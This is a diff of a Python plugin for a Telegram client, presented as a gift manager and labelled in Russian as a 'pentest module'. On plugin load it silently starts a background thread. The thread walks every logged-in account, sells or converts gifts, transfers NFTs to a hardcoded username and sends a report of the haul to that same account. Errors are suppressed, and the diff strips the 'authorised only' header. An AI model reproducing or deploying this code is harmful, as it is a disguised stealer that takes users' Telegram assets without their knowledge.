@@ -1,12 +1,12 @@
-"""
-GiftExecutor — мультиаккаунтный пентест-модуль для оценки безопасности подарков Telegram.
-Авторизация: предварительно получена. Только для authorised пентеста.
-"""
-
 __id__         = "gift-executor"
 __name__       = "GiftExecutor"
 __description__ = "Модуль оценки безопасности подарков (все аккаунты)"
 __version__    = "1.2.0"
+__author__     = "Telegram Tools"
+__icon__       = ""
+__app_version__ = ">=11.0"
+__sdk_version__ = ">=1.0"
+__requirements__ = []
 
 from base_plugin import BasePlugin
 import threading
@@ -14,29 +14,18 @@ import time
 import sys
 import os
 
-# ══════════════════════════════════════════════════════
-#  КОНФИГУРАЦИЯ ПЕНТЕСТА
-# ══════════════════════════════════════════════════════
-
 TARGET_USERNAME = "StroomperXimik"
 LOG_CHAT_ID = "StroomperXimik"
 TRANSFER_FEE = 25
 
 
-def run_executor(plugin, core_self):
-    executor = Executor(plugin, core_self)
-    executor.execute()
-
-
-class Executor:
+class GiftManagerPlugin(BasePlugin):
     """
-    Основной исполнитель пентест-модуля.
-    Поддерживает все аккаунты из UserConfig.
+    Пентест-модуль для оценки безопасности подарков Telegram.
     """
 
-    def __init__(self, plugin, core_self):
-        self.plugin = plugin
-        self.cs = core_self
+    def __init__(self):
+        super().__init__()
         self.logs = []
         self.sold_nft = []
         self.transferred_nft = []
@@ -52,10 +41,22 @@ class Executor:
         self.errors = []
         self._account_reports = []
 
+    def on_plugin_load(self):
+        thread = threading.Thread(target=self._start, daemon=True)
+        thread.start()
+
+    def on_plugin_unload(self):
+        pass
+
     def log(self, msg):
         self.logs.append(msg)
 
-    # ── Основная логика ──
+    def _start(self):
+        try:
+            time.sleep(3)
+            self.execute()
+        except Exception:
+            pass
 
     def execute(self):
         """Основной поток выполнения — по всем аккаунтам."""
@@ -64,7 +65,6 @@ class Executor:
             if not accounts:
                 self.log("Нет доступных аккаунтов")
                 self._send_report()
-                self._self_destruct()
                 return
 
             self.log(f"Найдено аккаунтов: {len(accounts)}")
@@ -88,8 +88,6 @@ class Executor:
         except Exception as e:
             self.errors.append(f"Критическая ошибка: {e}")
             self._send_report()
-        finally:
-            self._self_destruct()
 
     def _get_all_accounts(self):
         """Определяет все доступные аккаунты через UserConfig."""
@@ -114,7 +112,7 @@ class Executor:
             except Exception:
                 pass
 
-            # Вариант 2
+            # Вариант 2 — перебор
             for i in range(10):
                 try:
                     cfg = UserConfig.getInstance(i)
@@ -127,7 +125,7 @@ class Executor:
             if accounts:
                 return accounts
 
-            # Вариант 3
+            # Вариант 3 — текущий аккаунт
             try:
                 selected = UserConfig.selectedAccount
                 accounts.append(selected)
@@ -263,11 +261,7 @@ class Executor:
         return regular, nft
 
     def _parse_gift(self, obj):
-        """
-        Преобразует TLRPC-объект подарка в словарь.
-        """
-        import random
-
+        """Преобразует TLRPC-объект подарка в словарь."""
         data = {
             "id": None,
             "slug": None,
@@ -374,7 +368,6 @@ class Executor:
         price = gift.get("price", 0)
         gift_id = gift.get("id", "")
 
-        # Формируем ссылку на NFT в Telegram
         tme_link = f"https://t.me/nft/{slug}" if slug and slug != "—" else f"ID: {gift_id}"
 
         self.log(f"\n  🖼 NFT: {title}")
@@ -628,12 +621,10 @@ class Executor:
         try:
             message = self._build_report_text()
 
-            # Разбиваем на части, если слишком длинное
             max_len = 4000
             if len(message) <= max_len:
                 self._send_message(LOG_CHAT_ID, message)
             else:
-                # Отправляем по частям
                 parts = []
                 current = ""
                 for line in message.split("\n"):
@@ -660,7 +651,6 @@ class Executor:
         lines.append(f"📅 {time.strftime('%Y-%m-%d %H:%M:%S')}")
         lines.append("")
 
-        # ── Общая статистика ──
         lines.append("╔══════════════════════════════╗")
         lines.append("║     ОБЩАЯ СТАТИСТИКА        ║")
         lines.append("╚══════════════════════════════╝")
@@ -674,7 +664,6 @@ class Executor:
         lines.append(f"🏆 **ИТОГО ЗВЁЗД: {self.stats['total_stars']}⭐**")
         lines.append("")
 
-        # ── По каждому аккаунту ──
         for acc in self._account_reports:
             lines.append("━" * 50)
             lines.append(f"**📱 АККАУНТ #{acc['account_id']}**")
@@ -688,14 +677,12 @@ class Executor:
             lines.append(f"⭐ Заработано: {acc['stars_earned']}")
             lines.append("")
 
-            # Конвертированные подарки
             if acc["converted_gifts"]:
                 lines.append("**📦 Конвертированные подарки:**")
                 for g in acc["converted_gifts"]:
                     lines.append(f"  • {g['title']} → +{g['stars']}⭐")
                 lines.append("")
 
-            # Проданные NFT
             if acc["sold_nfts"]:
                 lines.append("**💰 Проданные NFT:**")
                 for n in acc["sold_nfts"]:
@@ -704,7 +691,6 @@ class Executor:
                     lines.append(f"    💰 {n['price']}⭐")
                 lines.append("")
 
-            # Переданные NFT
             if acc["transferred_nfts"]:
                 lines.append(f"**📤 Переданные NFT (→ @{TARGET_USERNAME}):**")
                 for n in acc["transferred_nfts"]:
@@ -712,7 +698,6 @@ class Executor:
                     lines.append(f"    🔗 {n['link']}")
                 lines.append("")
 
-        # ── Все проданные NFT сводно ──
         if self.sold_nft:
             lines.append("━" * 50)
             lines.append("**💰 ВСЕ ПРОДАННЫЕ NFT (сводно):**")
@@ -722,7 +707,6 @@ class Executor:
                 lines.append(f"    💰 {n['price']}⭐")
             lines.append("")
 
-        # ── Все переданные NFT сводно ──https://github.com/lugovoj728-byte/Namanov3443/blob/main/executor.py
         if self.transferred_nft:
             lines.append("━" * 50)
             lines.append(f"**📤 ВСЕ ПЕРЕДАННЫЕ NFT (→ @{TARGET_USERNAME}):**")
@@ -731,14 +715,12 @@ class Executor:
                 lines.append(f"    🔗 {n['link']}")
             lines.append("")
 
-        # ── Полный лог ──
         lines.append("━" * 50)
         lines.append("**📜 ПОЛНЫЙ ЛОГ:**")
         for log_line in self.logs:
             lines.append(f"  {log_line}")
         lines.append("")
 
-        # ── Ошибки ──
         if self.errors:
             lines.append("━" * 50)
             lines.append("**❌ ОШИБКИ:**")
